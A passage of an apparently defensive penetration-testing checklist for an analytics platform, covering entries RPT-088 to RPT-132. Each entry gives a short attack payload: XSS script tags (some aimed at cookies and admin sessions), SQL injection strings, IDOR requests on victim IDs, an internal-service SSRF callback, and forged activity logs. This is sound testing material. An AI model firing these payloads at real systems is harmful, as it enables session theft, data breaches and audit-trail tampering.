GET /api/users/victim_id/activity
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-088 — Activity Tracking Injection
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** User Activity Tracking

**Test Steps:** 1. Perform activity with XSS payload 2. Activity logged 3. Admin views log 4. XSS executes in admin context

**Expected Result:** Activity content should be sanitized

**Payload Example:**

```
Activity: <script>stealAdminSession()</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## RPT-089 — Activity Log SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** User Activity Tracking

**Test Steps:** 1. Search activity logs 2. Inject SQL in search 3. Extract all logs 4. Data breach

**Expected Result:** Log search should be parameterized

**Payload Example:**

```
search='; SELECT * FROM activity_logs--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-090 — Activity Timestamp Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** User Activity Tracking

**Test Steps:** 1. Activity logged with timestamp 2. Modify timestamp 3. Backdate activity 4. Falsify audit trail

**Expected Result:** Timestamps should be server-generated

**Payload Example:**

```
{"activity":"login",timestamp:"2020-01-01T00:00:00Z"}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## RPT-091 — Activity Log Forging
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** User Activity Tracking

**Test Steps:** 1. Find activity creation endpoint 2. Create fake activity 3. Frame other users 4. False audit trail

**Expected Result:** Activity logging should be system-only

**Payload Example:**

```
POST /api/activity {"user_id":"victim",action:"deleted_database"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-092 — Activity Export IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** User Activity Tracking

**Test Steps:** 1. Export own activity 2. Modify user_id 3. Export others' activity 4. Privacy breach

**Expected Result:** Export should verify user ownership

**Payload Example:**

```
GET /api/users/victim_id/activity/export
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-093 — Activity Tracking Bypass
**Test Category:** Security Bypass · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** User Activity Tracking

**Test Steps:** 1. Perform sensitive action 2. Block tracking request 3. Action not logged 4. Undetected activity

**Expected Result:** Tracking should be mandatory server-side

**Payload Example:**

```
Block analytics.js while performing action
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Browser DevTools / uBlock

**References:** CWE-840; PortSwigger Business logic

---

## RPT-094 — Activity Session Correlation
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** User Activity Tracking

**Test Steps:** 1. View activity with session data 2. Correlate sessions 3. Track user across sessions 4. Privacy violation

**Expected Result:** Session data should be anonymized

**Payload Example:**

```
Activity logs exposing session IDs
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Manual Review

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## RPT-095 — Activity IP Logging Exposure
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** User Activity Tracking

**Test Steps:** 1. View activity logs 2. Find IP addresses 3. Geolocate users 4. Privacy violation

**Expected Result:** IPs should be anonymized or restricted

**Payload Example:**

```
Activity logs containing full IP addresses
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## RPT-096 — Activity Log Deletion IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** User Activity Tracking

**Test Steps:** 1. Delete own activity 2. Modify log_id 3. Delete others' logs 4. Audit trail tampering

**Expected Result:** Log deletion should verify ownership

**Payload Example:**

```
DELETE /api/activity/victim_log_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-097 — Activity Enumeration
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** User Activity Tracking

**Test Steps:** 1. Iterate activity IDs 2. Find valid entries 3. Map user activity 4. Intelligence gathering

**Expected Result:** Activity IDs should be unpredictable

**Payload Example:**

```
/activity/1 through /activity/10000
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder / ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## RPT-098 — Cross-User Activity Correlation
**Test Category:** Privacy Violation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** User Activity Tracking

**Test Steps:** 1. View activity patterns 2. Correlate users 3. Identify relationships 4. Social graph exposure

**Expected Result:** Activity should not reveal relationships

**Payload Example:**

```
Activity logs showing user interactions
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Manual Analysis

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## RPT-099 — Conversion IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Conversion Tracking

**Test Steps:** 1. View own conversions 2. Modify campaign_id 3. View others' conversions 4. Competitive intelligence

**Expected Result:** Conversion data should be campaign-scoped

**Payload Example:**

```
GET /api/campaigns/victim_campaign/conversions
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-100 — Conversion Attribution Manipulation
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Conversion Tracking

**Test Steps:** 1. Complete conversion 2. Modify attribution 3. Credit wrong source 4. Analytics manipulation

**Expected Result:** Attribution should be tamper-proof

**Payload Example:**

```
{"conversion_id":"123",source:"attacker_campaign"}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## RPT-101 — Conversion Value Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Conversion Tracking

**Test Steps:** 1. Track conversion 2. Modify conversion value 3. Inflate metrics 4. False reporting

**Expected Result:** Conversion values should be server-validated

**Payload Example:**

```
{"conversion_value":9999999}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## RPT-102 — Conversion Injection
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Conversion Tracking

**Test Steps:** 1. Conversion with XSS in metadata 2. View conversion report 3. XSS executes 4. Admin compromise

**Expected Result:** Conversion metadata should be sanitized

**Payload Example:**

```
{"conversion_meta":"<script>alert(1)</script>"}
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## RPT-103 — Fake Conversion Submission
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Conversion Tracking

**Test Steps:** 1. Analyze conversion pixel 2. Submit fake conversion 3. Inflate conversion count 4. Billing fraud

**Expected Result:** Conversions should be validated

**Payload Example:**

```
Automated fake conversion submissions
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## RPT-104 — Conversion Pixel SSRF
**Test Category:** Server-Side Request Forgery · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Conversion Tracking

**Test Steps:** 1. Conversion tracking with callback 2. Set internal URL 3. Pixel fires 4. SSRF

**Expected Result:** Callback URLs should be validated

**Payload Example:**

```
callback=http://internal-service:8080
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## RPT-105 — Conversion Deduplication Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Conversion Tracking

**Test Steps:** 1. Submit conversion 2. Modify dedup key 3. Submit again 4. Count as two conversions

**Expected Result:** Deduplication should be robust

**Payload Example:**

```
Modify transaction_id for each submission
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## RPT-106 — Cross-Device Tracking Privacy
**Test Category:** Privacy Violation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Conversion Tracking

**Test Steps:** 1. Track conversion 2. Analyze cross-device data 3. Link user identities 4. Privacy violation

**Expected Result:** Cross-device tracking should be consented

**Payload Example:**

```
Correlating user IDs across devices without consent
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Manual Analysis

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## RPT-107 — Conversion Data Export IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Conversion Tracking

**Test Steps:** 1. Export own conversions 2. Modify scope 3. Export all conversions 4. Mass data breach

**Expected Result:** Export should verify ownership

**Payload Example:**

```
GET /api/conversions/export?scope=all
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-108 — Conversion Timestamp Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Conversion Tracking

**Test Steps:** 1. Submit conversion 2. Modify timestamp 3. Backdate conversion 4. Reporting manipulation

**Expected Result:** Timestamps should be server-generated

**Payload Example:**

```
{"converted_at":"2020-01-01T00:00:00Z"}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## RPT-109 — Conversion SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Conversion Tracking

**Test Steps:** 1. Query conversions 2. Inject SQL in filter 3. Extract all data 4. Data breach

**Expected Result:** Conversion queries should be parameterized

**Payload Example:**

```
date_filter='; SELECT * FROM conversions--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-110 — Funnel IDOR Access
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Funnel Analysis

**Test Steps:** 1. View own funnel 2. Modify funnel_id 3. View others' funnel 4. Competitive intelligence

**Expected Result:** Funnel access should verify ownership

**Payload Example:**

```
GET /api/funnels/victim_funnel_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-111 — Funnel Data IDOR
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Funnel Analysis

**Test Steps:** 1. View funnel data 2. Modify organization_id 3. View other org's funnel 4. Data breach

**Expected Result:** Funnel data should be org-scoped

**Payload Example:**

```
GET /api/funnels/123/data?org_id=victim_org
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-112 — Funnel Step Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Funnel Analysis

**Test Steps:** 1. View funnel steps 2. Modify step data 3. Alter conversion rates 4. False analytics

**Expected Result:** Funnel data should be immutable

**Payload Example:**

```
PUT /api/funnels/123/steps {"conversion_rate":100}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## RPT-113 — Funnel SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Funnel Analysis

**Test Steps:** 1. Create funnel with SQL 2. Funnel query executes 3. SQL injection 4. Data extraction

**Expected Result:** Funnel queries should be parameterized

**Payload Example:**

```
step_filter='; SELECT * FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-114 — Funnel XSS in Step Names
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Funnel Analysis

**Test Steps:** 1. Create funnel step with XSS 2. View funnel 3. Step name renders 4. XSS executes

**Expected Result:** Step names should be sanitized

**Payload Example:**

```
<script>alert('XSS')</script> as step name
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## RPT-115 — Funnel Event Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Funnel Analysis

**Test Steps:** 1. Track funnel event 2. Inject malicious event 3. Event processed 4. Data corruption

**Expected Result:** Events should be validated

**Payload Example:**

```
Send malformed funnel event data
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-116 — Funnel Time Range Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Funnel Analysis

**Test Steps:** 1. View funnel for allowed range 2. Modify date range 3. Access historical data 4. Unauthorized access

**Expected Result:** Date ranges should be validated

**Payload Example:**

```
Access data outside subscription period
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-117 — Funnel Comparison IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Funnel Analysis

**Test Steps:** 1. Compare own funnels 2. Add others' funnel 3. Compare with competitor 4. Intelligence leak

**Expected Result:** Comparison should verify all funnels

**Payload Example:**

```
{"funnel_ids":["own",victim_funnel]}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-118 — Funnel Export IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Funnel Analysis

**Test Steps:** 1. Export own funnel 2. Modify funnel_id 3. Export others' funnel 4. Data theft

**Expected Result:** Export should verify ownership

**Payload Example:**

```
GET /api/funnels/victim_id/export
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-119 — Funnel Segment Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Funnel Analysis

**Test Steps:** 1. View funnel with segment 2. Modify segment filter 3. Access restricted segment 4. Data breach

**Expected Result:** Segments should verify access

**Payload Example:**

```
segment=internal_users without permission
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-120 — Cohort IDOR Access
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Cohort Analysis

**Test Steps:** 1. View own cohort 2. Modify cohort_id 3. View others' cohort 4. Privacy violation

**Expected Result:** Cohort access should verify ownership

**Payload Example:**

```
GET /api/cohorts/victim_cohort_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-121 — Cohort Member Exposure
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Cohort Analysis

**Test Steps:** 1. View cohort 2. Access member list 3. Extract user identities 4. Privacy breach

**Expected Result:** Cohort members should be anonymized

**Payload Example:**

```
GET /api/cohorts/123/members returning user PII
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## RPT-122 — Cohort Creation SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Cohort Analysis

**Test Steps:** 1. Create cohort with criteria 2. Inject SQL in criteria 3. SQL executes 4. Data breach

**Expected Result:** Cohort queries should be parameterized

**Payload Example:**

```
criteria='; SELECT * FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-123 — Cohort Definition Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Cohort Analysis

**Test Steps:** 1. View cohort definition 2. Modify criteria 3. Alter cohort composition 4. Analytics manipulation

**Expected Result:** Cohort definitions should be protected

**Payload Example:**

```
Modify cohort criteria to include/exclude users
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## RPT-124 — Cohort XSS in Name
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Cohort Analysis

**Test Steps:** 1. Create cohort with XSS name 2. View cohort list 3. XSS executes 4. Session theft

**Expected Result:** Cohort names should be sanitized

**Payload Example:**

```
<script>alert(document.cookie)</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## RPT-125 — Cohort Cross-Organization Access
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Cohort Analysis

**Test Steps:** 1. View own org cohorts 2. Modify org_id 3. View other org's cohorts 4. Data breach

**Expected Result:** Cohorts should be org-scoped

**Payload Example:**

```
GET /api/cohorts?org_id=victim_org
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-126 — Cohort Retention Data IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Cohort Analysis

**Test Steps:** 1. View own retention 2. Modify cohort_id 3. View others' retention 4. Competitive intelligence

**Expected Result:** Retention data should verify ownership

**Payload Example:**

```
GET /api/cohorts/victim_id/retention
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-127 — Cohort Comparison IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Cohort Analysis

**Test Steps:** 1. Compare own cohorts 2. Add others' cohort 3. Compare data 4. Information disclosure

**Expected Result:** Comparison should verify all cohorts

**Payload Example:**

```
{"cohort_ids":["own",victim_cohort]}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-128 — Cohort User Enumeration
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Cohort Analysis

**Test Steps:** 1. Query cohort membership 2. Check user IDs 3. Enumerate valid users 4. User list extraction

**Expected Result:** Membership checks should not leak info

**Payload Example:**

```
Different responses for member vs non-member
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder / ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## RPT-129 — Cohort Time Travel Attack
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Cohort Analysis

**Test Steps:** 1. Query historical cohort 2. Modify query date 3. Access future cohorts 4. Preview unreleased data

**Expected Result:** Date validation should be enforced

**Payload Example:**

```
Query cohort data for future dates
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## RPT-130 — A/B Test IDOR Access
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** A/B Testing

**Test Steps:** 1. View own test 2. Modify test_id 3. View others' test 4. Competitive intelligence

**Expected Result:** Test access should verify ownership

**Payload Example:**

```
GET /api/ab-tests/victim_test_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-131 — A/B Test IDOR Modification
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** A/B Testing

**Test Steps:** 1. Edit own test 2. Modify test_id 3. Edit others' test 4. Sabotage testing

**Expected Result:** Modification should verify ownership

**Payload Example:**

```
PUT /api/ab-tests/victim_test_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-132 — A/B Test Variant Manipulation
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** A/B Testing

**Test Steps:** 1. Assigned to variant A 2. Modify variant assignment 3. Access variant B 4. Bypass test assignment

**Expected Result:** Variant assignment should be server-enforced

**Payload Example:**

```
{"user_id":"123",variant:"winning_variant"}
```

